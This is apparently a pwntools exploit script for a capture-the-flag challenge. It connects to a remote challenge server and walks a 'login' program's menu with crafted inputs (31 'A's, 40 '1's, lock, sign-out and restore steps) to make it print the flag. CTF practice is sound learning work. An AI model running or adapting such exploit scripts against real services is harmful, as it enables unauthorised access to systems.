from pwn import *
p = remote('thekidofarcrania.com', 13226)
#p = process('./login')

# menu.login('A'*31)
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('Username: ')
p.sendline('A'*31)

# menu.lock_user()
p.recvuntil('> ')
p.sendline('4')

# menu.sign_out()
p.recvuntil('> ')
p.sendline('2')

# menu.print_flag('1'*40)
p.recvuntil('> ')
p.sendline('3')
p.recvuntil('instead?\n')
p.sendline('1'*40)

# menu.restore_user()
p.recvuntil('> ')
p.sendline('5')

# menu.print_flag()
p.recvuntil('> ')
p.sendline('3')

p.interactive()

